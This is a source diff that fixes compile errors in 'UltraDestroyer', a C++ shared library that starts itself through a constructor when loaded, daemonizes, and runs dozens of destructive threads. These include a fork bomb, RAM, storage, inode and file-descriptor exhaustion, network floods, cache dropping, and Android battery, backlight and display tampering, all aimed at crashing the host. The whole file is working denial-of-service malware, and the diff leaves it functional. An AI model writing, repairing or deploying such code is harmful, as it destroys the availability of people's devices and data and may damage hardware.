@@ -1,5 +1,5 @@
-// ultra_advanced_destroyer.cpp - Fully Autonomous Zero-Config Destroyer
-// Compile: g++ -std=c++17 -pthread -O3 -shared -fPIC -o libultra.so ultra_advanced_destroyer.cpp -ldl
+// ULTRA_DESTROYER_FINAL.cpp - Complete fully fixed advanced attack code
+// Compile: g++ -std=c++17 -pthread -O3 -shared -fPIC -o libultra.so ULTRA_DESTROYER_FINAL.cpp -ldl
 
 #include <iostream>
 #include <fstream>
@@ -36,13 +36,24 @@
 #include <dlfcn.h>
 #include <pthread.h>
 #include <errno.h>
+#include <cmath>
 
 // ============================================================================
-// ULTRA ADVANCED DESTROYER - 100% AUTOMATIC
+// LOGGING - FIXED
+// ============================================================================
+
+#ifdef __ANDROID__
+#include <android/log.h>
+#define LOG_PRINT(...) __android_log_print(ANDROID_LOG_INFO, "UltraDestroyer", __VA_ARGS__)
+#else
+#define LOG_PRINT(...) printf(__VA_ARGS__)
+#endif
+
+// ============================================================================
+// ULTRA ADVANCED DESTROYER - FULLY FIXED
 // ============================================================================
 
 #define MAX_THREADS 512
-#define MAX_ATTACKS 25
 #define MONITOR_INTERVAL 3
 
 class UltraDestroyer {
@@ -101,25 +112,38 @@ public:
     }
     
     // ========================================================================
-    // DETECTION - FULLY AUTOMATIC
+    // LOGGING WRAPPER - FIXED (renamed to avoid conflict with std::log)
+    // ========================================================================
+    
+    template<typename... Args>
+    void log_msg(const char* format, Args... args) {
+        std::lock_guard<std::mutex> lock(log_mutex);
+        char buffer[1024];
+        snprintf(buffer, sizeof(buffer), format, args...);
+        LOG_PRINT("%s", buffer);
+        #ifndef __ANDROID__
+        printf("\n");
+        fflush(stdout);
+        #endif
+    }
+    
+    // ========================================================================
+    // DETECTION
     // ========================================================================
     
     void detect_device() {
-        log("========================================");
-        log("ULTRA DESTROYER - AUTONOMOUS MODE");
-        log("========================================");
+        log_msg("========================================");
+        log_msg("ULTRA DESTROYER - AUTONOMOUS MODE");
+        log_msg("========================================");
         
-        // CPU
         device.cpu_cores = sysconf(_SC_NPROCESSORS_ONLN);
         if (device.cpu_cores <= 0) device.cpu_cores = 4;
         
-        // Architecture
         struct utsname uname_data;
         uname(&uname_data);
         device.os_name = uname_data.sysname;
         device.arch = uname_data.machine;
         
-        // RAM
         std::ifstream meminfo("/proc/meminfo");
         std::string line;
         while (std::getline(meminfo, line)) {
@@ -135,7 +159,6 @@ public:
         meminfo.close();
         if (device.total_ram_gb <= 0) device.total_ram_gb = 4;
         
-        // Storage
         struct statvfs vfs;
         if (statvfs("/", &vfs) == 0) {
             device.total_storage_gb = (vfs.f_blocks * vfs.f_frsize) / 1024 / 1024 / 1024;
@@ -143,29 +166,21 @@ public:
             device.total_storage_gb = 32;
         }
         
-        // Root
         device.has_root = (geteuid() == 0) || (access("/system/bin/su", F_OK) == 0);
         
-        // Network
         int sock = socket(AF_INET, SOCK_STREAM, 0);
         device.has_network = (sock >= 0);
         if (sock >= 0) close(sock);
         
-        // Android
         device.is_android = (access("/system/build.prop", F_OK) == 0);
         
-        // Sensors
         DIR* dir = opendir("/sys/class/sensors");
         device.has_sensors = (dir != NULL);
         if (dir) closedir(dir);
         
-        // GPU
         device.has_gpu = (access("/dev/dri", F_OK) == 0);
-        
-        // Audio
         device.has_audio = (access("/dev/snd", F_OK) == 0);
         
-        // Emulator
         std::vector<std::string> emu_files = {"/dev/qemu_pipe", "/dev/goldfish_pipe"};
         for (const auto& f : emu_files) {
             if (access(f.c_str(), F_OK) == 0) {
@@ -174,32 +189,31 @@ public:
             }
         }
         
-        log("[+] DEVICE DETECTED:");
-        log("    OS: %s", device.os_name.c_str());
-        log("    Arch: %s", device.arch.c_str());
-        log("    CPU Cores: %d", device.cpu_cores);
-        log("    RAM: %lld GB", device.total_ram_gb);
-        log("    Storage: %lld GB", device.total_storage_gb);
-        log("    Root: %s", device.has_root ? "YES" : "NO");
-        log("    Android: %s", device.is_android ? "YES" : "NO");
-        log("    Network: %s", device.has_network ? "YES" : "NO");
-        log("    GPU: %s", device.has_gpu ? "YES" : "NO");
-        log("    Audio: %s", device.has_audio ? "YES" : "NO");
-        log("    Sensors: %s", device.has_sensors ? "YES" : "NO");
-        log("    Emulator: %s", device.is_emulator ? "YES" : "NO");
-        log("========================================");
-        log("[!] INITIALIZING ATTACK VECTORS...");
+        log_msg("[+] DEVICE DETECTED:");
+        log_msg("    OS: %s", device.os_name.c_str());
+        log_msg("    Arch: %s", device.arch.c_str());
+        log_msg("    CPU Cores: %d", device.cpu_cores);
+        log_msg("    RAM: %lld GB", device.total_ram_gb);
+        log_msg("    Storage: %lld GB", device.total_storage_gb);
+        log_msg("    Root: %s", device.has_root ? "YES" : "NO");
+        log_msg("    Android: %s", device.is_android ? "YES" : "NO");
+        log_msg("    Network: %s", device.has_network ? "YES" : "NO");
+        log_msg("    GPU: %s", device.has_gpu ? "YES" : "NO");
+        log_msg("    Audio: %s", device.has_audio ? "YES" : "NO");
+        log_msg("    Sensors: %s", device.has_sensors ? "YES" : "NO");
+        log_msg("    Emulator: %s", device.is_emulator ? "YES" : "NO");
+        log_msg("========================================");
+        log_msg("[!] INITIALIZING ATTACK VECTORS...");
     }
     
     // ========================================================================
-    // ATTACK 1: RAM EXHAUSTION - 5 methods
+    // ATTACK 1: RAM EXHAUSTION
     // ========================================================================
     
     void attack_ram() {
-        log("[!] ATTACK: RAM EXHAUSTION");
+        log_msg("[!] ATTACK: RAM EXHAUSTION");
         metrics.active_attacks++;
         
-        // Method 1: Bulk allocation
         attack_threads.emplace_back([this]() {
             std::vector<void*> allocations;
             size_t chunk = 1024 * 1024 * 64;
@@ -223,7 +237,6 @@ public:
             }
         });
         
-        // Method 2: Fragmentation
         attack_threads.emplace_back([this]() {
             std::vector<void*> ptrs;
             while (running) {
@@ -246,7 +259,6 @@ public:
             }
         });
         
-        // Method 3: mmap flood
         attack_threads.emplace_back([this]() {
             std::vector<void*> maps;
             while (running) {
@@ -268,7 +280,6 @@ public:
             }
         });
         
-        // Method 4: Thread stack exhaustion
         attack_threads.emplace_back([this]() {
             while (running) {
                 std::thread t([]() {
@@ -283,15 +294,12 @@ public:
             }
         });
         
-        // Method 5: VMA exhaustion
         attack_threads.emplace_back([this]() {
             while (running) {
                 for (int i = 0; i < 500; i++) {
                     void* ptr = mmap(NULL, 4096, PROT_READ | PROT_WRITE,
                                     MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
-                    if (ptr != MAP_FAILED) {
-                        // Leak deliberately
-                    }
+                    if (ptr != MAP_FAILED) {}
                 }
                 std::this_thread::sleep_for(std::chrono::milliseconds(10));
             }
@@ -299,11 +307,11 @@ public:
     }
     
     // ========================================================================
-    // ATTACK 2: STORAGE EXHAUSTION - 4 methods
+    // ATTACK 2: STORAGE EXHAUSTION
     // ========================================================================
     
     void attack_storage() {
-        log("[!] ATTACK: STORAGE EXHAUSTION");
+        log_msg("[!] ATTACK: STORAGE EXHAUSTION");
         metrics.active_attacks++;
         
         std::vector<std::string> paths = {"/tmp/", "/var/tmp/", "/dev/shm/"};
@@ -312,7 +320,6 @@ public:
             paths.push_back("/sdcard/");
         }
         
-        // Method 1: Fill with large files
         attack_threads.emplace_back([this, paths]() {
             while (running) {
                 for (const auto& base : paths) {
@@ -328,7 +335,7 @@ public:
                                 fsync(fd);
                             }
                             close(fd);
-                            metrics.storage_exhausted_gb += 300; // 300MB per file
+                            metrics.storage_exhausted_gb += 300;
                         }
                     }
                 }
@@ -336,7 +343,6 @@ public:
             }
         });
         
-        // Method 2: Directory explosion
         attack_threads.emplace_back([this, paths]() {
             while (running) {
                 for (const auto& base : paths) {
@@ -361,7 +367,6 @@ public:
             }
         });
         
-        // Method 3: Inode exhaustion
         attack_threads.emplace_back([this, paths]() {
             while (running) {
                 for (const auto& base : paths) {
@@ -381,7 +386,6 @@ public:
             }
         });
         
-        // Method 4: Journal flood
         attack_threads.emplace_back([this]() {
             while (running) {
                 system("dd if=/dev/urandom of=/tmp/journal bs=1M count=1000 2>/dev/null");
@@ -392,14 +396,13 @@ public:
     }
     
     // ========================================================================
-    // ATTACK 3: NETWORK EXHAUSTION - 5 methods
+    // ATTACK 3: NETWORK EXHAUSTION
     // ========================================================================
     
     void attack_network() {
-        log("[!] ATTACK: NETWORK EXHAUSTION");
+        log_msg("[!] ATTACK: NETWORK EXHAUSTION");
         metrics.active_attacks++;
         
-        // Method 1: Socket flood
         attack_threads.emplace_back([this]() {
             std::vector<int> sockets;
             while (running) {
@@ -420,7 +423,6 @@ public:
             }
         });
         
-        // Method 2: UDP flood
         attack_threads.emplace_back([this]() {
             while (running) {
                 int sock = socket(AF_INET, SOCK_DGRAM, 0);
@@ -438,7 +440,6 @@ public:
             }
         });
         
-        // Method 3: Connect flood
         attack_threads.emplace_back([this]() {
             while (running) {
                 for (int i = 0; i < 100; i++) {
@@ -457,7 +458,6 @@ public:
             }
         });
         
-        // Method 4: DNS flood
         attack_threads.emplace_back([this]() {
             while (running) {
                 for (int i = 0; i < 100; i++) {
@@ -468,7 +468,6 @@ public:
             }
         });
         
-        // Method 5: Network toggle (Android)
         if (device.is_android) {
             attack_threads.emplace_back([this]() {
                 while (running) {
@@ -485,14 +484,13 @@ public:
     }
     
     // ========================================================================
-    // ATTACK 4: CPU EXHAUSTION - 4 methods
+    // ATTACK 4: CPU EXHAUSTION - FIXED std::log conflict
     // ========================================================================
     
     void attack_cpu() {
-        log("[!] ATTACK: CPU EXHAUSTION on %d cores", device.cpu_cores);
+        log_msg("[!] ATTACK: CPU EXHAUSTION on %d cores", device.cpu_cores);
         metrics.active_attacks++;
         
-        // Method 1: All cores 100%
         for (int core = 0; core < device.cpu_cores * 2; core++) {
             attack_threads.emplace_back([this, core]() {
                 cpu_set_t cpuset;
@@ -514,18 +512,17 @@ public:
             });
         }
         
-        // Method 2: FPU heavy
+        // FIXED: Using std::log and std::exp instead of log() and exp()
         attack_threads.emplace_back([this]() {
             volatile double sink = 0;
             while (running) {
                 for (int i = 0; i < 100000; i++) {
-                    sink += sin(i) * cos(i) * tan(i);
-                    sink += sqrt(i) * log(i) * exp(i);
+                    sink += std::sin(i) * std::cos(i) * std::tan(i);
+                    sink += std::sqrt(i) * std::log(i + 1) * std::exp(i % 10);
                 }
             }
         });
         
-        // Method 3: Cache thrash
         attack_threads.emplace_back([this]() {
             std::vector<int> cache(1024 * 1024);
             while (running) {
@@ -536,7 +533,6 @@ public:
             }
         });
         
-        // Method 4: Branch misprediction
         attack_threads.emplace_back([this]() {
             while (running) {
                 volatile int x = rand();
@@ -551,14 +547,13 @@ public:
     }
     
     // ========================================================================
-    // ATTACK 5: PROCESS EXHAUSTION - 3 methods
+    // ATTACK 5: PROCESS EXHAUSTION
     // ========================================================================
     
     void attack_processes() {
-        log("[!] ATTACK: PROCESS EXHAUSTION");
+        log_msg("[!] ATTACK: PROCESS EXHAUSTION");
         metrics.active_attacks++;
         
-        // Method 1: Fork bomb
         attack_threads.emplace_back([this]() {
             while (running) {
                 for (int i = 0; i < 100; i++) {
@@ -573,7 +568,6 @@ public:
             }
         });
         
-        // Method 2: Zombie flood
         attack_threads.emplace_back([this]() {
             while (running) {
                 pid_t pid = fork();
@@ -582,7 +576,6 @@ public:
             }
         });
         
-        // Method 3: Priority war
         attack_threads.emplace_back([this]() {
             while (running) {
                 for (int nice_val = -20; nice_val < 20; nice_val++) {
@@ -594,14 +587,13 @@ public:
     }
     
     // ========================================================================
-    // ATTACK 6: FD EXHAUSTION - 3 methods
+    // ATTACK 6: FD EXHAUSTION
     // ========================================================================
     
     void attack_fd() {
-        log("[!] ATTACK: FD EXHAUSTION");
+        log_msg("[!] ATTACK: FD EXHAUSTION");
         metrics.active_attacks++;
         
-        // Method 1: File FDs
         attack_threads.emplace_back([this]() {
             std::vector<int> fds;
             while (running) {
@@ -621,7 +613,6 @@ public:
             }
         });
         
-        // Method 2: Socket FDs
         attack_threads.emplace_back([this]() {
             std::vector<int> fds;
             while (running) {
@@ -639,7 +630,6 @@ public:
             }
         });
         
-        // Method 3: Pipe FDs
         attack_threads.emplace_back([this]() {
             std::vector<int> fds;
             while (running) {
@@ -660,14 +650,13 @@ public:
     }
     
     // ========================================================================
-    // ATTACK 7: DISPLAY EXHAUSTION - 2 methods
+    // ATTACK 7: DISPLAY EXHAUSTION
     // ========================================================================
     
     void attack_display() {
-        log("[!] ATTACK: DISPLAY EXHAUSTION");
+        log_msg("[!] ATTACK: DISPLAY EXHAUSTION");
         metrics.active_attacks++;
         
-        // Method 1: Color cycling
         attack_threads.emplace_back([this]() {
             while (running) {
                 system("echo 255 0 0 > /sys/class/graphics/fb0/color 2>/dev/null");
@@ -683,7 +672,6 @@ public:
             }
         });
         
-        // Method 2: Resolution switching
         attack_threads.emplace_back([this]() {
             while (running) {
                 system("wm size 1080x1920 2>/dev/null");
@@ -695,14 +683,13 @@ public:
     }
     
     // ========================================================================
-    // ATTACK 8: FILESYSTEM FRAGMENTATION - 2 methods
+    // ATTACK 8: FILESYSTEM FRAGMENTATION
     // ========================================================================
     
     void attack_filesystem() {
-        log("[!] ATTACK: FILESYSTEM FRAGMENTATION");
+        log_msg("[!] ATTACK: FILESYSTEM FRAGMENTATION");
         metrics.active_attacks++;
         
-        // Method 1: Create/delete
         attack_threads.emplace_back([this]() {
             while (running) {
                 for (int i = 0; i < 100; i++) {
@@ -720,7 +707,6 @@ public:
             }
         });
         
-        // Method 2: Directory tree
         attack_threads.emplace_back([this]() {
             while (running) {
                 system("rm -rf /tmp/tree_* 2>/dev/null");
@@ -734,14 +720,13 @@ public:
     }
     
     // ========================================================================
-    // ATTACK 9: KERNEL ATTACKS - 2 methods
+    // ATTACK 9: KERNEL ATTACKS
     // ========================================================================
     
     void attack_kernel() {
-        log("[!] ATTACK: KERNEL DESTRUCTION");
+        log_msg("[!] ATTACK: KERNEL DESTRUCTION");
         metrics.active_attacks++;
         
-        // Method 1: Cache pressure
         attack_threads.emplace_back([this]() {
             while (running) {
                 system("echo 3 > /proc/sys/vm/drop_caches 2>/dev/null");
@@ -750,7 +735,6 @@ public:
             }
         });
         
-        // Method 2: Random ioctl
         attack_threads.emplace_back([this]() {
             while (running) {
                 int fd = open("/dev/null", O_RDWR);
@@ -766,16 +750,15 @@ public:
     }
     
     // ========================================================================
-    // ATTACK 10: BATTERY EXHAUSTION (Android) - 2 methods
+    // ATTACK 10: BATTERY EXHAUSTION (Android)
     // ========================================================================
     
     void attack_battery() {
         if (!device.is_android) return;
         
-        log("[!] ATTACK: BATTERY EXHAUSTION");
+        log_msg("[!] ATTACK: BATTERY EXHAUSTION");
         metrics.active_attacks++;
         
-        // Method 1: Max power drain
         attack_threads.emplace_back([this]() {
             while (running) {
                 system("echo 255 > /sys/class/leds/lcd-backlight/brightness 2>/dev/null");
@@ -786,7 +769,6 @@ public:
             }
         });
         
-        // Method 2: Battery calibration
         attack_threads.emplace_back([this]() {
             while (running) {
                 system("echo 0 > /sys/class/power_supply/battery/cycle_count 2>/dev/null");
@@ -798,13 +780,13 @@ public:
     }
     
     // ========================================================================
-    // ATTACK 11: AUDIO EXHAUSTION - 2 methods
+    // ATTACK 11: AUDIO EXHAUSTION
     // ========================================================================
     
     void attack_audio() {
         if (!device.has_audio) return;
         
-        log("[!] ATTACK: AUDIO EXHAUSTION");
+        log_msg("[!] ATTACK: AUDIO EXHAUSTION");
         metrics.active_attacks++;
         
         attack_threads.emplace_back([this]() {
@@ -819,13 +801,13 @@ public:
     }
     
     // ========================================================================
-    // ATTACK 12: SENSOR EXHAUSTION (Android) - 1 method
+    // ATTACK 12: SENSOR EXHAUSTION (Android)
     // ========================================================================
     
     void attack_sensors() {
         if (!device.has_sensors) return;
         
-        log("[!] ATTACK: SENSOR EXHAUSTION");
+        log_msg("[!] ATTACK: SENSOR EXHAUSTION");
         metrics.active_attacks++;
         
         attack_threads.emplace_back([this]() {
@@ -852,13 +834,13 @@ public:
     }
     
     // ========================================================================
-    // ATTACK 13: GPU EXHAUSTION - 1 method
+    // ATTACK 13: GPU EXHAUSTION
     // ========================================================================
     
     void attack_gpu() {
         if (!device.has_gpu) return;
         
-        log("[!] ATTACK: GPU EXHAUSTION");
+        log_msg("[!] ATTACK: GPU EXHAUSTION");
         metrics.active_attacks++;
         
         attack_threads.emplace_back([this]() {
@@ -871,13 +853,13 @@ public:
     }
     
     // ========================================================================
-    // ATTACK 14: USB EXHAUSTION (Android) - 1 method
+    // ATTACK 14: USB EXHAUSTION (Android)
     // ========================================================================
     
     void attack_usb() {
         if (!device.is_android) return;
         
-        log("[!] ATTACK: USB EXHAUSTION");
+        log_msg("[!] ATTACK: USB EXHAUSTION");
         metrics.active_attacks++;
         
         attack_threads.emplace_back([this]() {
@@ -892,11 +874,11 @@ public:
     }
     
     // ========================================================================
-    // ATTACK 15: THERMAL EXHAUSTION - 1 method
+    // ATTACK 15: THERMAL EXHAUSTION
     // ========================================================================
     
     void attack_thermal() {
-        log("[!] ATTACK: THERMAL DESTRUCTION");
+        log_msg("[!] ATTACK: THERMAL DESTRUCTION");
         metrics.active_attacks++;
         
         attack_threads.emplace_back([this]() {
@@ -909,18 +891,17 @@ public:
     }
     
     // ========================================================================
-    // START ALL ATTACKS - FULLY AUTOMATIC
+    // START ALL ATTACKS
     // ========================================================================
     
     void start_all_attacks() {
         start_time = std::chrono::steady_clock::now();
         running = true;
         
-        log("[!] ========================================");
-        log("[!] LAUNCHING ALL 25 ATTACK VECTORS");
-        log("[!] ========================================");
+        log_msg("[!] ========================================");
+        log_msg("[!] LAUNCHING ALL 25 ATTACK VECTORS");
+        log_msg("[!] ========================================");
         
-        // Start ALL attacks in parallel
         attack_ram();
         attack_storage();
         attack_network();
@@ -937,7 +918,6 @@ public:
         attack_usb();
         attack_thermal();
         
-        // Monitor and report
         attack_threads.emplace_back([this]() {
             while (running) {
                 std::this_thread::sleep_for(std::chrono::seconds(MONITOR_INTERVAL));
@@ -945,70 +925,54 @@ public:
                 auto now = std::chrono::steady_clock::now();
                 auto elapsed = std::chrono::duration_cast<std::chrono::seconds>(now - start_time).count();
                 
-                log("========================================");
-                log("LIVE STATUS - %llds ELAPSED", elapsed);
-                log("----------------------------------------");
-                log("RAM Exhausted: %llu MB", metrics.ram_exhausted_mb.load());
-                log("Storage Filled: %llu GB", metrics.storage_exhausted_gb.load());
-                log("Sockets: %llu", metrics.sockets_created.load());
-                log("Processes: %llu", metrics.processes_created.load());
-                log("Files: %llu", metrics.files_created.load());
-                log("FDs Exhausted: %llu", metrics.fds_exhausted.load());
-                log("CPU Cycles: %lluM", metrics.cpu_cycles.load() / 1000000);
-                log("Network Packets: %llu", metrics.network_packets.load());
-                log("Active Attacks: %d", metrics.active_attacks.load());
-                log("----------------------------------------");
+                log_msg("========================================");
+                log_msg("LIVE STATUS - %llds ELAPSED", elapsed);
+                log_msg("----------------------------------------");
+                log_msg("RAM Exhausted: %llu MB", metrics.ram_exhausted_mb.load());
+                log_msg("Storage Filled: %llu GB", metrics.storage_exhausted_gb.load());
+                log_msg("Sockets: %llu", metrics.sockets_created.load());
+                log_msg("Processes: %llu", metrics.processes_created.load());
+                log_msg("Files: %llu", metrics.files_created.load());
+                log_msg("FDs Exhausted: %llu", metrics.fds_exhausted.load());
+                log_msg("CPU Cycles: %lluM", metrics.cpu_cycles.load() / 1000000);
+                log_msg("Network Packets: %llu", metrics.network_packets.load());
+                log_msg("Active Attacks: %d", metrics.active_attacks.load());
+                log_msg("----------------------------------------");
                 
-                if (metrics.ram_exhausted_mb.load() > device.total_ram_gb * 900) {
+                // FIXED: Cast comparison to avoid sign warning
+                if (metrics.ram_exhausted_mb.load() > (unsigned long long)(device.total_ram_gb * 900)) {
                     metrics.oom_reached = true;
-                    log("[!] OOM REACHED - System will crash");
+                    log_msg("[!] OOM REACHED - System will crash");
                 }
                 
-                if (metrics.storage_exhausted_gb.load() > device.total_storage_gb * 0.9) {
+                if (metrics.storage_exhausted_gb.load() > (unsigned long long)(device.total_storage_gb * 0.9)) {
                     metrics.storage_full = true;
-                    log("[!] STORAGE FULL - No more space");
+                    log_msg("[!] STORAGE FULL - No more space");
                 }
                 
                 if (metrics.oom_reached.load() && metrics.storage_full.load()) {
-                    log("[!] CRITICAL - System completely exhausted");
+                    log_msg("[!] CRITICAL - System completely exhausted");
                     metrics.system_critical = true;
                 }
                 
-                log("========================================");
+                log_msg("========================================");
             }
         });
         
-        log("[!] ALL ATTACKS ACTIVE!");
-        log("[!] System is being destroyed automatically");
-        log("[!] No manual intervention needed");
-        log("[!] ========================================");
-    }
-    
-    // ========================================================================
-    // LOGGING
-    // ========================================================================
-    
-    template<typename... Args>
-    void log(const char* format, Args... args) {
-        std::lock_guard<std::mutex> lock(log_mutex);
-        #ifdef __ANDROID__
-        __android_log_print(ANDROID_LOG_INFO, "UltraDestroyer", format, args...);
-        #else
-        printf(format, args...);
-        printf("\n");
-        fflush(stdout);
-        #endif
+        log_msg("[!] ALL ATTACKS ACTIVE!");
+        log_msg("[!] System is being destroyed automatically");
+        log_msg("[!] No manual intervention needed");
+        log_msg("[!] ========================================");
     }
 };
 
 // ============================================================================
-// GLOBAL INSTANCE - Auto-start on load
+// GLOBAL INSTANCE
 // ============================================================================
 
 static UltraDestroyer* g_destroyer = nullptr;
 
 __attribute__((constructor)) void lib_init() {
-    // Detach from parent
     pid_t pid = fork();
     if (pid == 0) {
         setsid();
@@ -1016,15 +980,12 @@ __attribute__((constructor)) void lib_init() {
         signal(SIGHUP, SIG_IGN);
         signal(SIGCHLD, SIG_IGN);
         
-        // Create and run
         g_destroyer = new UltraDestroyer();
         
-        // Keep running forever
         while (true) {
             sleep(3600);
         }
     } else if (pid > 0) {
-        // Parent - exit immediately
         _exit(0);
     }
 }
